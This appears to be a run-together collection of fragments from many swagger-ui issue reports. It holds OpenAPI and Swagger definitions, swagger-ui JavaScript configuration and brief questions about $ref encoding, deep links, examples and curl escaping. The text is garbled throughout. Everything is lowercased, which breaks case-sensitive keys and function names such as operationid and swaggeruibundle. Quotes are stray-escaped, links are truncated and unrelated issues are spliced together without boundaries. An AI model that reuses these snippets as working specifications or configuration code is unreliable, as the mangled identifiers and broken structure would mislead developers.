components: schemas: httpvalidationerror: title: httpvalidationerror type: object properties: detail: title: detail type: array items: $ref: '#/components/schemas/validationerror' validationerror: title: validationerror required: - loc - msg - type type: object properties: loc: title: location type: array items: type: string msg: title: message type: string type: title: error type type: string
``` swagger-ui configuration options:
const ui = swaggeruibundle({ url: '/openapi.json',
oauth2redirecturl: window.location.origin + \'/docs/oauth2-redirect\', dom_id: \'#swagger-ui\', presets: [ swaggeruibundle.presets.apis, swaggeruibundle.swaggeruistandalonepreset ], layout: "baselayout", deeplinking: true
(no query string)
nothing out of the ordinary
just running docker version example swagger/openapi definition:
openapi: 3.0.0
info: title: todo api description: todo api version: 1.0.0
servers: - url: '{scheme}://{host}:{port}{basepath}' description: generic request that defaults to values for local service variables: scheme: description: request scheme enum: - http - https default: http host: description: server host default: localhost port: description: the port of the service default: '8000' basepath: description: base path options, leave empty for use with mock service enum: - '' - /services/opp/todos/1.0.0 default: /services/opp/todos/1.0.0
tags: - name: tasks description: tasks
paths: /todos: get: tags: - tasks summary: list the available tasks description: | the list of tasks can be filtered by their status
operationid: todo.todos.api.query parameters: - name: id in: query description: todo id to filter on schema: type: string example: 42 - name: page_token in: query description: pagination page token schema: type: string - name: per_page in: query description: the max number of items to include per page or results
schema: type: integer - name: status in: query description: filters the tasks by their status required: false schema: type: string enum: - done - waiting - working example: working responses: '200': description: successfully content: application/json: schema: $ref: '#/components/schemas/todos' '422': description: invalid query parameter key or value content: 'application/problem+json': schema: $ref: '#/components/schemas/problemdetail'
``` swagger-ui configuration options:
<!-- so that we can help
--> swagger/openapi definition:
openapi: 3.0.2
info: title: test description: test version: "0.1"
paths: /first: get: description: get responses: '200': description: successful operation content: application/json: schema: $ref: '#/components/schemas/requestmeta' /second: get: description: get responses: '200': description: successful operation content: application/json: schema: $ref: '#/components/schemas/requestmeta' examples: metaexample: $ref: '#/components/examples/metacontent2'
components: schemas: requestmeta: description: blabla type: object required: - request properties: request: description: \'schema version(s) to be used for the components specified\' type: object example: $ref: \'#/components/examples/metacontent\' examples: metacontent: value: individual: - "ga4gh-phenopacket-individual-v0.1" - "ga4gh-schemablocks-individual-v0.1" variant: - "ga4gh-variant-representation-v0.1" - "ga4gh-schemablocks-beacon-variant-v0.1" metacontent2: value: request: individual: - "ga4gh-phenopacket-individual-v0.1" - "ga4gh-schemablocks-individual-v0.1" variant: - "ga4gh-variant-representation-v0.1" - "ga4gh-schemablocks-beacon-variant-v0.1"
example swagger/openapi definition: file: /openapi/openapi.yaml
openapi: "3.0.0"
info: version: 1.0.0 title: swagger petstore license: name: mit paths: /pets/{petid}: $ref: ./petstore.yaml#/paths/~1pets~1{petid}
``` file: /openapi/petstore.yaml
openapi: "3.0.0"
info: version: 1.0.0 title: swagger petstore license: name: mit paths: /pets/{petid}: parameters: - $ref: '#/components/parameters/petidpathparam' get: summary: info for a specific pet operationid: showpetbyid tags: - pets parameters: - $ref: '#/components/parameter/petidpathparam' responses: '200': description: ok options: summary: show problem with parameter not displayed operationid: showpetbyid tags: - pets responses: '200': description: ok components: parameters: petidpathparam: - in: path name: petid required: true description: the id of the pet to retrieve schema: type: string
``` swagger-ui configuration options:
file: /openapi/swagger-ui-config.json
{ "urls": [ { "name": "petstore.yaml", "url": "/openapi/petstore.yaml" }, { "name": "openapi.yaml", "url": "/openapi/openapi.yaml" } ], "urls.primaryname": "openapi.yaml"
?configurl=/openapi/swagger-ui-config.json
swagger-ui configuration options:
swaggerui({ urls: [ ]
```json "requestbody": { "description": "a zip file containing files that will be unzipped", "content": { "application/octet-stream": { "schema": { "type": "string", "format": "binary", "nullable": true } } }, "required": true }
<!-- so that we can help
--> swagger/openapi definition:
swagger:` '2.0'
info: description: 'swagger docs' title: api example version: '1.0'
host: server
basepath: /docs
paths: '/ws/person': get: parameters: - name: id type: number in: path description: 'person id' required: true description: get person operationid: 'get_person' tags: - person responses: '200': description: ok schema: type: object properties: result: $ref: '#/definitions/custom%3a%3anamespace%3a%3aperson'
definitions: 'custom::namespace::person': properties: id: type: number firstname: type: string lastname: type: string address: type: array items: $ref: '#/definitions/custom%3a%3anamespace%3a%3aaddress' 'custom::namespace::address': properties: id: type: number street: type: string city: type: string
``` ### how can we help?
in order to generate json without warnings some part $ref needs to be percent encoded, and not
is this correct behavior, or maybe bug
way to reproduce this issue:
* current json that contains part without and part with percent encoding will not have warnings.
* if we convert $ref without percent encoding warning will popup `$ref: '#/definitions/custom::namespace::person'`
* if we convert $ref with all characters percent encoding warning will popup `$ref: '%23%2fdefinitions%2fcustom%3a%3anamespace%3a%3aperson'`
openapi: 3.0.0
info: title: incorrect example reference syntax version: 1.0.0
paths: /foo: post: requestbody: content: application/json: schema: {} examples: incorrect: value: - $ref: '#/components/examples/myexample' summary: this is not a valid example reference correct: $ref: '#/components/examples/myexample' responses: '200': description: ok components: examples: myexample: value: foo: bar
i have inherited a project from someone else setting up swagger-ui standalone in our website, importing a list of urls from a json file and trying to use deeplinking to jump straight to operations in the page so i can link around from page to page
swagger-ui configuration options:
i load up the urlslistfile to grab the data and then drop it into the urls as an array (i would be totally happy with a different way of doing this, but i need to pick the urlslistfile based on version selected in another part of the site)
```js jquery.getjson(urlslistfile, function( data ) { const ui = swaggeruibundle({ urls: data.urls, dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], supportedsubmitmethods: [], layout: "standalonelayout" }); window.ui = ui; })
``` i got this url by clicking on the location section of the locations api page and it created this for me
i copied and put it in another section of my site.
?urls.primaryname=locations#/location
![screen shot 2019-07-17 at 4 22 50 pm]( example swagger/openapi definition:
swagger: '2.0'
info: description: broken line break version: 1.0
basepath: /test
schemes: - https
securitydefinitions: apikeyauth: type: apikey in: header name: apikey
paths: /test/brokennewline: get: tags: - broken new line summary: broken new line example description: broken new line yaml example operationid: brokennewline consumes: - application/json produces: - application/json security: - apikeyauth: [] parameters: - name: x-applicationnamea description: | this works note the dash on the line bellow e.g
cxmobile-56789 in: header required: true type: string - name: x-applicationnameb description: | this should be also be two lines e.g
cxmobile156789 in: header required: true type: string ```
example swagger/openapi definition:
openapi: 3.0.2
info: title: test version: 0.0.0
paths: /foo: post: requestbody: description: a json object, xml object, or text string containing foo data required: true content: application/json: schema: type: object examples: foo_json: value: foo: bar bar_json: value: bar: foo text/plain: schema: type: string example: hello, world! application/xml: schema: type: object examples: foo_xml: value: <foo>bar</foo> bar_xml: value: <bar>foo</bar> responses: 201: description: created
any generic configuration will do as the bug is functionality related.
example swagger/openapi definition:
openapi: 3.0.2
info: title: test version: 0.0.0
paths: /foo: post: requestbody: required: true content: application/json: # schema: {} # <--- if you uncomment this line, "example value" appears example: foo: bar responses: 200: description: the response displays example value - even though there\'s no schema content: application/json: example: foo: bar
i'm just loading dist/index.html directly in my browser and pointing ui at my server
example swagger/openapi definition:
sorry, proprietary, but all you need to know is no `host`, `basepath`, or `schemes` value is defined
swagger-ui configuration options:
git repository is completely unmodified and clean.
i use a visual studio extension to render things on the fly (openapi-designer) and have checked that it uses the latest version of swagger-ui example swagger/openapi definition:
startdate: type: string format: date example: 2018-12-25
<details><summary>broken</summary>
{ "openapi": "3.0.0", "info": { "title": "api", "version": "1.0" }, "servers": [{ "url": "/1.0" }], "components": { "schemas": { "baseerror": { "required": [ "code", "message" ], "type": "object", "properties": { "message": { "type": "string" }, "code": { "type": "integer" } } }, "basestringlist": { "type": "array", "items": { "type": "string" } }, "baselink": { "type": "object", "properties": { "rel": { "type": "string" }, "href": { "type": "string", "format": "uri" } } }, "baselinklist": { "type": "object", "properties": { "links": { "type": "array", "items": { "$ref": "#/components/schemas/baselink" } } } }, "baseteam": { "type": "object", "properties": { "teamname": { "type": "string" } } }, "linkedteam": { "allof": [{ "$ref": "#/components/schemas/baseteam" }, { "$ref": "#/components/schemas/baselinklist" }] }, "baseteamlist": { "type": "object", "properties": { "data": { "type": "array", "items": { "$ref": "#/components/schemas/linkedteam" } } } }, "linkedteamlist": { "allof": [{ "$ref": "#/components/schemas/baseteamlist" }, { "$ref": "#/components/schemas/baselinklist" }] }, "baseadgroups": { "type": "object", "properties": { "deploy": { "$ref": "#/components/schemas/basestringlist" } } }, "basevpc": { "type": "object", "properties": { "cidr": { "type": "string" } } }, "basesubnet": { "type": "object", "properties": { "vpc": { "$ref": "#/components/schemas/basevpc" } } }, "baseregion": { "type": "object", "properties": { "regionname": { "type": "string" }, "subnet": { "$ref": "#/components/schemas/basesubnet" } } }, "baseregionlist": { "type": "array", "items": { "$ref": "#/components/schemas/baseregion" } }, "baseaccountmodifiable": { "type": "object", "properties": { "adgroups": { "$ref": "#/components/schemas/baseadgroups" } } }, "baseaccountcreate": { "allof": [{ "$ref": "#/components/schemas/baseaccountmodifiable" }, { "type": "object", "properties": { "organizationname": { "type": "string" }, "teamname": { "maxlength": 12, "minlength": 1, "type": "string" } } }] }, "baseaccount": { "allof": [{ "$ref": "#/components/schemas/baseaccountcreate" }, { "type": "object", "properties": { "regionmapping": { "$ref": "#/components/schemas/baseregionlist" }, "accountname": { "type": "string" }, "accountstatus": { "type": "string" } } }] }, "linkedaccount": { "allof": [{ "$ref": "#/components/schemas/baseaccount" }, { "$ref": "#/components/schemas/baselinklist" }] }, "baseaccountlist": { "type": "object", "properties": { "data": { "type": "array", "items": { "$ref": "#/components/schemas/linkedaccount" } } } }, "linkedaccountlist": { "allof": [{ "$ref": "#/components/schemas/baseaccountlist" }, { "$ref": "#/components/schemas/baselinklist" }] } }, "responses": { "notfound": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } }, "root": { "description": "list of routes", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baselinklist" } } } }, "teamlist": { "description": "list of teams", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedteamlist" } } } }, "accountlist": { "description": "list of accounts", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccountlist" } } } }, "account": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } } }, "parameters": { "teamname": { "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }, "environment": { "name": "environment", "in": "path", "description": "the account environment.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } } }, "requestbodies": { "accountcreate": { "description": "account update json", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseaccountcreate" } } }, "required": true }, "accountmodify": { "description": "account create json", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseaccountmodifiable" } } }, "required": true } } }, "paths": { "/": { "get": { "summary": "list all routes", "operationid": "api.get_list", "responses": { "200": { "description": "list of routes", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baselinklist" } } } } } } }, "/accounts": { "get": { "summary": "list all accounts", "operationid": "api.account.get_list", "responses": { "200": { "description": "list of accounts", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccountlist" } } } } } }, "post": { "summary": "create an account", "operationid": "api.account.create", "requestbody": { "$ref": "#/components/requestbodies/accountcreate" }, "responses": { "200": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } } } } }, "/teams": { "get": { "summary": "list all teams", "operationid": "api.team.get_list", "responses": { "200": { "description": "list of teams", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedteamlist" } } } } } } }, "/teams/{teamname}": { "get": { "summary": "list team accounts", "operationid": "api.team.get", "parameters": [{ "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }], "responses": { "200": { "description": "list of accounts", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccountlist" } } } }, "404": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } } } } }, "/teams/{teamname}/{environment}": { "get": { "summary": "get team account", "operationid": "api.account.get", "parameters": [{ "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }, { "name": "environment", "in": "path", "description": "the account environment.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }], "responses": { "200": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } }, "404": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } } } }, "patch": { "summary": "update team account", "operationid": "api.account.update", "parameters": [{ "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }, { "name": "environment", "in": "path", "description": "the account environment.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }], "requestbody": { "$ref": "#/components/requestbodies/accountmodify" }, "responses": { "200": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } }, "404": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } } } } } }
</details> <details><summary>working</summary>
{ "openapi": "3.0.0", "info": { "title": "api", "version": "1.0" }, "servers": [{ "url": "/1.0" }], "paths": { "/": { "get": { "summary": "list all routes", "operationid": "api.get_list", "responses": { "200": { "description": "list of routes", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baselinklist" } } } } } } }, "/accounts": { "get": { "summary": "list all accounts", "operationid": "api.account.get_list", "responses": { "200": { "description": "list of accounts", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccountlist" } } } } } }, "post": { "summary": "create an account", "operationid": "api.account.create", "requestbody": { "$ref": "#/components/requestbodies/accountcreate" }, "responses": { "200": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } } } } }, "/teams": { "get": { "summary": "list all teams", "operationid": "api.team.get_list", "responses": { "200": { "description": "list of teams", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedteamlist" } } } } } } }, "/teams/{teamname}": { "get": { "summary": "list team accounts", "operationid": "api.team.get", "parameters": [{ "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }], "responses": { "200": { "description": "list of accounts", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccountlist" } } } }, "404": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } } } } }, "/teams/{teamname}/{environment}": { "get": { "summary": "get team account", "operationid": "api.account.get", "parameters": [{ "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }, { "name": "environment", "in": "path", "description": "the account environment.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }], "responses": { "200": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } }, "404": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } } } }, "patch": { "summary": "update team account", "operationid": "api.account.update", "parameters": [{ "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }, { "name": "environment", "in": "path", "description": "the account environment.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }], "requestbody": { "$ref": "#/components/requestbodies/accountmodify" }, "responses": { "200": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } }, "404": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } } } } } }, "components": { "schemas": { "baseerror": { "required": [ "code", "message" ], "type": "object", "properties": { "message": { "type": "string" }, "code": { "type": "integer" } } }, "basestringlist": { "type": "array", "items": { "type": "string" } }, "baselink": { "type": "object", "properties": { "rel": { "type": "string" }, "href": { "type": "string", "format": "uri" } } }, "baselinklist": { "type": "object", "properties": { "links": { "type": "array", "items": { "$ref": "#/components/schemas/baselink" } } } }, "baseteam": { "type": "object", "properties": { "teamname": { "type": "string" } } }, "linkedteam": { "allof": [{ "$ref": "#/components/schemas/baseteam" }, { "$ref": "#/components/schemas/baselinklist" }] }, "baseteamlist": { "type": "object", "properties": { "data": { "type": "array", "items": { "$ref": "#/components/schemas/linkedteam" } } } }, "linkedteamlist": { "allof": [{ "$ref": "#/components/schemas/baseteamlist" }, { "$ref": "#/components/schemas/baselinklist" }] }, "baseadgroups": { "type": "object", "properties": { "deploy": { "$ref": "#/components/schemas/basestringlist" } } }, "basevpc": { "type": "object", "properties": { "cidr": { "type": "string" } } }, "basesubnet": { "type": "object", "properties": { "vpc": { "$ref": "#/components/schemas/basevpc" } } }, "baseregion": { "type": "object", "properties": { "regionname": { "type": "string" }, "subnet": { "$ref": "#/components/schemas/basesubnet" } } }, "baseregionlist": { "type": "array", "items": { "$ref": "#/components/schemas/baseregion" } }, "baseaccountmodifiable": { "type": "object", "properties": { "adgroups": { "$ref": "#/components/schemas/baseadgroups" } } }, "baseaccountcreate": { "allof": [{ "$ref": "#/components/schemas/baseaccountmodifiable" }, { "type": "object", "properties": { "organizationname": { "type": "string" }, "teamname": { "maxlength": 12, "minlength": 1, "type": "string" } } }] }, "baseaccount": { "allof": [{ "$ref": "#/components/schemas/baseaccountcreate" }, { "type": "object", "properties": { "regionmapping": { "$ref": "#/components/schemas/baseregionlist" }, "accountname": { "type": "string" }, "accountstatus": { "type": "string" } } }] }, "linkedaccount": { "allof": [{ "$ref": "#/components/schemas/baseaccount" }, { "$ref": "#/components/schemas/baselinklist" }] }, "baseaccountlist": { "type": "object", "properties": { "data": { "type": "array", "items": { "$ref": "#/components/schemas/linkedaccount" } } } }, "linkedaccountlist": { "allof": [{ "$ref": "#/components/schemas/baseaccountlist" }, { "$ref": "#/components/schemas/baselinklist" }] } }, "responses": { "notfound": { "description": "resource was not found", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseerror" } } } }, "root": { "description": "list of routes", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baselinklist" } } } }, "teamlist": { "description": "list of teams", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedteamlist" } } } }, "accountlist": { "description": "list of accounts", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccountlist" } } } }, "account": { "description": "an account", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/linkedaccount" } } } } }, "parameters": { "teamname": { "name": "teamname", "in": "path", "description": "the team name.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } }, "environment": { "name": "environment", "in": "path", "description": "the account environment.", "required": true, "style": "simple", "explode": false, "schema": { "type": "string" } } }, "requestbodies": { "accountcreate": { "description": "account update json", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseaccountcreate" } } }, "required": true }, "accountmodify": { "description": "account create json", "content": { "application/json": { "schema": { "$ref": "#/components/schemas/baseaccountmodifiable" } } }, "required": true } } }
example swagger/openapi definition:
basepath: /control
- application/json
definitions: objectquerywithkeys: properties: condition: $ref: '#/definitions/objectquerycondition' objectquerycondition: properties: conditionstype: type: string conditions: items: $ref: '#/definitions/objectquerycondition' type: array
info: description: yeah, whatever
title: controller version: '1.0'
paths: /pstate/classes/purchaseorder/objects/query: post: parameters: - description: structured object query in: body name: query required: true schema: $ref: '#/definitions/objectquerywithkeys' responses: '204': description: no content
- application/json
swagger: '2.0'
example swagger/openapi definition:
openapi: 3.0.0
servers: []
info: description: sdf version: "1.0.0" title: swagger petstore
paths: /pet: get: tags: - pet summary: $ref: operationid: addpet responses: '405': description: invalid input
example swagger/openapi definition:
excerpt from edited petstore json found here:
paths: /pet/with/a/really/long/made/up/path/that/keeps/going/and/going/and/when/will/it/ever/stop/nobody/knows/: post: tags: - pet summary: m:microsoft.somenamespace.some.really.long.namespace.somecontroller.methodname(system.string,system.string,system.string,system.string,newtonsoft.json.linq.jtoken) description: ''
``` ### swagger-ui configuration options:
easily reproducible in the swagger ui rendered by the editor at editor.swagger.io
i am using the default configuration in connexion (zalando/connexion on github).
swagger-ui configuration options:
swaggerui({ configurl: document.location.origin + \'/swagger-config.yaml\', dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl, swaggeruibundle.plugins.topbar ], operationssorter: "alpha", tagssorter: "alpha", layout: "standalonelayout", validatorurl: null
``` swagger-config.yaml ```yaml
urls: - name: common url: /api/common/index.json - name: v1 url: /api/v1/index.json - name: v2 url: /api/v2/index.yaml
urls.primaryname: v1
use example swagger spec with spaces in the operations: initialise swagger bundle with docexpansion set to 'none'
example swagger/openapi definition:
swagger: "2.0"
info: description: "this is a sample server petstore server
you can find out more about swagger at [ or on [irc.freenode.net, #swagger](
for this sample, you can use the api key `special-key` to test the authorization filters." version: "1.0.0" title: "swagger petstore" termsofservice: " " contact: email: "apiteam@swagger.io" license: name: "apache 2.0" url: " "
host: "petstore.swagger.io"
basepath: "/v2"
produces: - application/json - application/xml - text/csv
consumes: - application/json
paths: /pet: post: tags: - "pet" summary: "add a new pet to the store" description: "" operationid: "addpet" parameters: - in: "body" name: "body" description: "pet object that needs to be added to the store" required: true schema: $ref: "#/definitions/pet" responses: 405: description: "invalid input" /pet/findbystatus: $ref: "status.yaml#/paths/findbystatus"
status.yaml
paths: findbystatus: get: tags: - "pet" summary: "finds pets by status" description: "multiple status values can be provided with comma separated strings" operationid: "findpetsbystatus" parameters: - name: "status" in: "query" description: "status values that need to be considered for filter" required: true type: "array" items: type: "string" enum: - "available" - "pending" - "sold" default: "available" collectionformat: "multi"
``` swagger-ui configuration options:
swaggerui({ url: window.location.origin+"/index.yaml", dom_id: \'#swagger-ui\', tagssorter: "alpha", operationssorter: "alpha", docexpansion: \'none\', defaultmodelexpanddepth: 5, displayrequestduration: true, deeplinking: true, validatorurl: null, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl, ], layout: "standalonelayout"
javascript swagger-ui configuration:
swaggerui({ // this is the default configuration url: " ", dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout"
``` query parameter swagger-ui configuration:
?configurl=/someurl/swagger-config.json
``` swagger-ui configuration endpoint response body:
{ "urls": "/someurl/openapi.json"
example swagger/openapi definition:
n/a swagger-ui configuration options:
function _usp(url, fn) { url = url.split('?'); var usp = new urlsearchparams(url[1]); fn(usp); url[1] = usp.tostring(); return url[1] ? url.join('?') : url[0];
} function setqueryparam(url, key, value) { return _usp(url, function (usp) { usp.set(key, value); });
} swaggerui({ requestinterceptor: function (request) { if (request.loadspec) { // pass query params from the swagger-ui page to the spec request var query = new urlsearchparams(window.location.search).entries(); for (var it = query.next(); !it.done; it = query.next()) { request.url = setqueryparam(request.url, it.value[0], it.value[1]); } } return request; }; // ..
other stuff
example swagger/openapi definition:
i tested this with the petstore openapi doc also
swagger-ui configuration options:
this is what my config.json looks like
{ "dom_id": "#swagger-ui", "deeplinking": true, "docexpansion": "none"
i have configured swashbuckle to attach a json header to every request
![image]( ### how can we help?
when i use the "try it out" feature it works as expected and i see my browser sending the json out in the header:
![image]( when i try to copy and paste the curl command to my cygwin bash for git for windows i see that the pipe in the header was not properly escaped so the command fails:
`curl -x get " {id}" -h "accept: application/json" -h "custom_header: [{"type":"pipe|test","value":"value"},{"type":"test2","value":"value2"}]"`
![image]( is it fair to think that the ui should escape the header value for anything bash may miss-interpret so that the experience between the "try it out" and curl is the same?
example swagger/openapi definition:
``` "requestbody": { "content": { "multipart/form-data": { "schema": { "$ref": "./schemas/body/myfile.json#/somefile" } } }
``` and somefile is: ```
{ "somefile": { "type": "object", "properties": { "name": { "type": "string", "required": "true" } } }
``` swagger-ui configuration options:
const ui = swaggeruibundle({ url: "myfile.json", dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout" })
#### example swagger/openapi definition: ```yaml
components: requestbodies: pet: content: application/json: schema: "$ref": "#/components/schemas/pet" application/xml: schema: "$ref": "#/components/schemas/pet" description: pet object that needs to be added to the store required: true schemas: category: properties: id: format: int64 type: integer name: type: string type: object xml: name: category order: properties: complete: default: false type: boolean id: format: int64 type: integer petid: format: int64 type: integer quantity: format: int32 type: integer shipdate: format: date-time type: string status: description: order status enum: - placed - approved - delivered type: string type: object xml: name: order pet: properties: category: "$ref": "#/components/schemas/category" id: format: int64 type: integer name: example: doggie type: string photourls: items: type: string type: array xml: name: photourl wrapped: true status: description: pet status in the store enum: - available - pending - sold type: string tags: items: "$ref": "#/components/schemas/tag" type: array xml: name: tag wrapped: true required: - name - photourls type: object xml: name: pet tag: properties: id: format: int64 type: integer name: type: string type: object xml: name: tag
info: contact: email: apiteam@swagger.io description: this is a sample petstore server
title: swagger petstore version: 1.0.0
openapi: 3.0.0
paths: "/pet": post: requestbody: "$ref": "#/components/requestbodies/pet" responses: \'405\': description: invalid input summary: add a new pet to the store tags: - pet
servers: []
``` swagger-ui configuration options:
swaggeruibundle({ url: "test.json", dom_id: \'#swagger-ui\', presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout", deeplinking: true }) ``` #### url ```
#/pet/post_pet
example swagger/openapi definition:
openapi: 3.0.0
servers: - url: 'https://{host}/{basepath}' variables: host: default: 0.0.0.0 basepath: default: api
info: title: example version: 1.0.0
paths: /repositories: post: summary: register one repository requestbody: required: true content: application/json: schema: $ref: '#/components/schemas/repository' responses: '200': description: ok content: application/json: {} security: - bearerauth: []
components: schemas: repository: type: object properties: repository_id: type: string description: repository id definition: type: string description: pgp message example: repoistory_id: example_repo definiton: "-----begin pgp message-----\ version: gnupg v1\ \ blahblahblah\ -----end pgp message-----\ " securityschemes: bearerauth: type: http scheme: bearer links: {} callbacks: {}
security: []
``` swagger-editor configuration options:
example swagger/openapi definition:
openapi: 3.0.1
info: title: test version: "0.1"
paths: /test: post: operationid: dummy responses: default: description: dummy callbacks: subscription: post: description: dummy parameters: - name: dummy in: query schema: type: string responses: default: description: dummy
describe a path with empty "requestbody" object example swagger/openapi definition: `{ "paths": { "some/route": { "post": { "operationid": "someid", "tags": [ "some" ], "requestbody": {},
"responses": {
"description": "description"
example swagger/openapi definition:
openapi: '3.0.0'
info: title: "foo" version: 1.0.0 servers: - url: paths: /upload/: post: tags: - "upload" operationid: "upload" requestbody: required: true content: multipart/form-data: # media type schema: type: object properties: # request parts file: type: string format: binary options: type: object properties: some_array: type: array items: type: string max_bar: type: integer default: 300 responses: \'200\': description: ok content: application/json: schema: type: object properties: foo: type: string
<!-- so that we can help
--> swagger-ui configuration options:
import swaggerui from 'swagger-ui'
import swaggeruistandalonepreset from 'swagger-ui/dist/swagger-ui-standalone-preset' window.onload = function() { const ui = swaggerui({ configurl: '/api/swagger-config.json', dom_id: '#swagger-ui', presets: [ swaggerui.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggerui.plugins.downloadurl ], layout: 'standalonelayout', filter: true, requestinterceptor: function(request) { // handle csrf return request; }, responseinterceptor: function (response) { // handle json prefix return response } })
}) window.ui = ui
and my swagger-config.json file:
{ "url": "/swagger-portal.json", "filter": true, "deeplinking": true, "validatorurl": null
``` ### how can we help?
my swagger config file (define in configurl parameter) is downloaded two times (illustrated in the screenshot below).
from the code [src/core/index.js]( #l173-l182) and [src/core/plugins/configs/spec-actions.js]( #l10-l12) it's normal.
however i think it might be more efficient to check if the requests parameter exists before calling the _getconfigbyurl_ method in the if condition to avoid double downloading.
maybe i missed something?
in main file:
security: - localtestuser: [] components: securityschemes: localtestuser: { $ref: 'common/auth.yaml#/components/securityschemes/localtestuser' }
``` in auth.yaml:
components: securityschemes: localtestuser: type: apikey in: header name: x-test-user
``` swagger-ui configuration options:
swaggerui({ dom_id: '#swagger-ui', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset, ], layout: 'standalonelayout',
example swagger/openapi definition:
```yaml ``` swagger-ui configuration options:
swaggerui({ })
``` ``` ```
![screen shot 2018-08-08 at 11 56 42]( example swagger/openapi definition:
- url: https://{customerkey}-{projectkey}.digitalcx.com description: the production api server
# variables:
# customerkey:
# default: something
# description: this is your customer key (provided when the app was setup)
# projectkey:
# default: something
# description: this is your project key (provided when the app was setup)
``` swagger-ui configuration options:
i am using `swagger-ui-express` but nothing else on the swaggerui() function configuration
an example value of "string" is showed for the application/octet-stream response type
example swagger/openapi definition:
'200': content: application/octet-stream: schema: type: string format: binary
example swagger/openapi definition:
openapi: 3.0.0
info: version: 1.0.0 title: swagger petstore license: name: mit
servers: - url: '
paths: /pets: get: summary: list all pets operationid: listpets tags: - pets responses: '200': description: an paged array of pets headers: x-next: description: a link to the next page of responses schema: type: string
``` swagger-ui configuration options:
swaggerui({ url: " ", dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, ], plugins: [ swaggeruibundle.plugins.downloadurl, ], requestinterceptor: req => { //return req; return new promise((resolve, reject) => resolve(req)); }
example swagger/openapi definition:
* yaml file is available [here]( swagger-ui configuration options:
```js swaggeruibundle({ url: ' domnode: $('#test') })
example swagger/openapi definition:
openapi: 3.0.1
info: title: test version: 0.0.0
paths: /foo: get: parameters: - in: query name: test required: true schema: type: string enum: - wrongoption - correctoption responses: '200': description: ok
api being split over several files
openapi: 3.0.0 info: version: v1.0 title: testing description: testing paths: /testa: $ref: 'testa.yaml' /testb: $ref: 'testb.yaml'
``` testa.yaml
get: responses: 200: description: ok content: application/json: schema: $ref: 'non_existant.yaml#/schemas/testa'
